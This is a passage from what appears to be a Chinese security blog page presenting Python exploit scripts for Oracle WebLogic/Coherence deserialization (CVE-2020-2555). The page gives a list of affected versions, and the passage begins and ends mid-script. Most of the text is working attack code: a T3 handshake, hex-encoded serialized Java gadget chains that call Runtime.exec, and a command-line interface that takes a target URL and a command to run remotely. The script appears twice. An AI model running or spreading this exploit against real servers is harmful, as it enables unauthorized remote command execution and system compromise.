&#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">        data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">        data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">        for d in [data1,data2,data3,data4]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">            sock.send(d.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">        #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">    def sendEvilObjData(self,sock,data):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        payload&#x3D;&#39;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">70</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">71</span></pre></td><td class="code"><pre><span class="line">        payload+&#x3D;&#39;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">72</span></pre></td><td class="code"><pre><span class="line">        payload &#x3D; &#39;%s%s&#39;%(&#39;&#123;:08x&#125;&#39;.format(len(payload)&#x2F;2 + 4),payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">73</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">74</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">75</span></pre></td><td class="code"><pre><span class="line">        sock.send(payload.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">76</span></pre></td><td class="code"><pre><span class="line">        res &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">77</span></pre></td><td class="code"><pre><span class="line">        n&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">78</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">79</span></pre></td><td class="code"><pre><span class="line">            while True:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">80</span></pre></td><td class="code"><pre><span class="line">                n +&#x3D; 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">81</span></pre></td><td class="code"><pre><span class="line">                res +&#x3D; sock.recv(4096)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">82</span></pre></td><td class="code"><pre><span class="line">                time.sleep(0.1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">83</span></pre></td><td class="code"><pre><span class="line">                if(n&gt;15):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">84</span></pre></td><td class="code"><pre><span class="line">                    break</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">85</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">86</span></pre></td><td class="code"><pre><span class="line">            pass</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">87</span></pre></td><td class="code"><pre><span class="line">        return res</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">88</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">89</span></pre></td><td class="code"><pre><span class="line">    def check(self, url, cmd,timeout, proxies&#x3D;globalProxies, **args):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">90</span></pre></td><td class="code"><pre><span class="line">        (proto, ip, port, uri) &#x3D; parseUrl(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">91</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">92</span></pre></td><td class="code"><pre><span class="line">        server_addr &#x3D; (ip, int(port))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">93</span></pre></td><td class="code"><pre><span class="line">        if proto &#x3D;&#x3D; &#39;https&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">94</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">95</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">96</span></pre></td><td class="code"><pre><span class="line">            sock &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">97</span></pre></td><td class="code"><pre><span class="line">        sock.settimeout(timeout)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">98</span></pre></td><td class="code"><pre><span class="line">        try:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">99</span></pre></td><td class="code"><pre><span class="line">            self.t3handshake(sock,server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">100</span></pre></td><td class="code"><pre><span class="line">            self.buildT3RequestObject(sock,port)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">101</span></pre></td><td class="code"><pre><span class="line">            payload &#x3D; CVE_2020_2555(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">102</span></pre></td><td class="code"><pre><span class="line">            resp &#x3D; self.sendEvilObjData(sock,payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">103</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">104</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[+] Payload send succeed! Please check.&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">105</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">106</span></pre></td><td class="code"><pre><span class="line">            return True</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">107</span></pre></td><td class="code"><pre><span class="line">        except Exception as e:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">108</span></pre></td><td class="code"><pre><span class="line">            print (&#39;[-] Failed! Exception:&#123;&#125;&#39;.format(str(e)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">109</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">110</span></pre></td><td class="code"><pre><span class="line">        return False</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">111</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">112</span></pre></td><td class="code"><pre><span class="line">def poc(url,cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">113</span></pre></td><td class="code"><pre><span class="line">    x &#x3D; payloadtest()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">114</span></pre></td><td class="code"><pre><span class="line">    return x.check(url, cmd,20)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">115</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">116</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">117</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">118</span></pre></td><td class="code"><pre><span class="line">    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;Weblogic cve-2020-2555 Exp&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">119</span></pre></td><td class="code"><pre><span class="line">                                     usage&#x3D;&#39;[*] use &quot;python %(prog)s --help&quot; for more information&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">120</span></pre></td><td class="code"><pre><span class="line">                                     formatter_class&#x3D;argparse.RawTextHelpFormatter)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">121</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">122</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;url&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">123</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the url to check&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">124</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">125</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">126</span></pre></td><td class="code"><pre><span class="line">    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">127</span></pre></td><td class="code"><pre><span class="line">                        dest&#x3D;&quot;cmd&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">128</span></pre></td><td class="code"><pre><span class="line">                        help&#x3D;&quot;the cmd to run on the target&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">129</span></pre></td><td class="code"><pre><span class="line">                        )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">130</span></pre></td><td class="code"><pre><span class="line">    args &#x3D; parser.parse_args()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">131</span></pre></td><td class="code"><pre><span class="line">    if not args.url or not args.cmd:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">132</span></pre></td><td class="code"><pre><span class="line">        sys.exit(&#39;[*] Please assign url and cmd! \n[*] Examples python cve-2020-2883_cmd.py -u http:&#x2F;&#x2F;127.0.0.1:7001 -c calc&#39;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">133</span></pre></td><td class="code"><pre><span class="line">    poc(args.url, args.cmd)</span></pre></td></tr></table></figure><h1 id="Oracle-Coherence-反序列化漏洞（CVE-2020-2555）"><a href="#Oracle-Coherence-反序列化漏洞（CVE-2020-2555）" class="headerlink" title="Oracle Coherence 反序列化漏洞（CVE-2020-2555）"></a>Oracle Coherence 反序列化漏洞（CVE-2020-2555）</h1><h2 id="version-6"><a href="#version-6" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.1.3.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.1.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.2.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.3.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Oracle weblogic 12.2.1.4.0</span></pre></td></tr></table></figure><h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">import socket</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">import time</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">import ssl</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">import binascii</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">import urlparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">import argparse</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">globalProxies &#x3D; &#123;&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">header &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &#39;User-Agent&#39;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">def parseUrl(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    parsed &#x3D; urlparse.urlparse(url)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    proto &#x3D; parsed.scheme</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    netloc &#x3D; parsed.netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">    ip &#x3D; netloc</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    if proto &#x3D;&#x3D; &#39;http&#39;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 80</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">    else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; 443</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">    if (&#39;:&#39; in netloc):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        ip &#x3D; netloc.split(&#39;:&#39;)[0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        port &#x3D; netloc.split(&#39;:&#39;)[1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">    uri &#x3D; parsed.path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">    return (proto, ip, port, uri)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">def CVE_2020_2555(cmd):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">    payload_start &#x3D; &#39;aced00057372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc4020000787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd22390200007870000000037372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e756d6265724c000e6465636c6172696e67436c61737371007e00054c000866696c654e616d6571007e00054c000a6d6574686f644e616d6571007e000578700000004374002079736f73657269616c2e7061796c6f6164732e4356455f323032305f323535357400124356455f323032305f323535352e6a6176617400096765744f626a6563747371007e000b0000000171007e000d71007e000e71007e000f7371007e000b0000002274001979736f73657269616c2e47656e65726174655061796c6f616474001447656e65726174655061796c6f61642e6a6176617400046d61696e737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e00077872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b7870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000007704000000007871007e001a7873720024636f6d2e74616e676f736f6c2e7574696c2e66696c7465722e4c696d697446696c74657299022596d7b4595302000649000b6d5f635061676553697a654900076d5f6e506167654c000c6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c00086d5f66696c74657274001a4c636f6d2f74616e676f736f6c2f7574696c2f46696c7465723b4c000f6d5f6f416e63686f72426f74746f6d71007e00014c000c6d5f6f416e63686f72546f7071007e0001787000000000000000007372002c636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e436861696e6564457874726163746f72889f81b0945d5b7f02000078720036636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374436f6d706f73697465457874726163746f72086b3d8c05690f440200015b000c6d5f61457874726163746f727400235b4c636f6d2f74616e676f736f6c2f7574696c2f56616c7565457874726163746f723b7872002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4162737472616374457874726163746f72658195303e7238210200014900096d5f6e546172676574787000000000757200235b4c636f6d2e74616e676f736f6c2e7574696c2e56616c7565457874726163746f723b2246204735c4a0fe0200007870000000047372002d636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e4964656e74697479457874726163746f72936ee080c7259c4b0200007871007e0022000000007372002f636f6d2e74616e676f736f6c2e7574696c2e657874726163746f722e5265666c656374696f6e457874726163746f72ee7ae995c02fb4a20200025b00096d5f616f506172616d7400135b4c6a6176612f6c616e672f4f626a6563743b4c00096d5f734d6574686f6471007e00057871007e002200000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65707400096765744d6574686f647371007e0028000000007571007e002b000000027070740006696e766f6b657371007e0028000000007571007e002b0000000174&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">    payload_lenhex &#x3D; &#39;&#123;:04x&#125;&#39;.format(len(cmd))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">    payload_cmdhex &#x3D; binascii.b2a_hex(cmd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">    payload_end &#x3D; &#39;7400046578656370767200116a6176612e6c616e672e52756e74696d650000000000000000000000787070&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; payload_start + payload_lenhex + payload_cmdhex + payload_end</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">    return payload</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">class payloadtest(object):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    def __init__(self):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">        self.vuln &#x3D; &#39;cve_2020_2555&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">    def t3handshake(self,sock,server_addr):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">        sock.connect(server_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">        sock.send(&#39;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#39;.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">        time.sleep(1)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">        data &#x3D; sock.recv(1024)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">        #print data</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">        #print &#39;handshake successful&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">    def buildT3RequestObject(self,sock,port):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">        data1 &#x3D; &#39;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">        data2 &#x3D; &#39;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd60000000700001b19ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">        data3 &#x3D; &#39;1a7727000d3234322e323134&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">62</span></pre></td><td class="code"><pre><span class="line">        data4 &#x3D; &#39;2e312e32353461863d1d0000000078&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">63</span></pre></td><td class="code"><pre><span class="line">        for d in [data1,data2,data3,data4]:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">64</span></pre></td><td class="code"><pre><span class="line">            sock.send(d.decode(&#39;hex&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">65</span></pre></td><td class="code"><pre><span class="line">        time.sleep(2)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">66</span></pre></td><td class="code"><pre><span class="line">        #print &#39;send request payload successful,recv length:%d&#39;%(len(sock.recv(2048)))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">67</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">68</span></pre></td><td class="code"><pre><span class="line">    def sendEvilObjData(self,sock,data):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">69</span></pre></td><td class="code"><pre><span class="line">        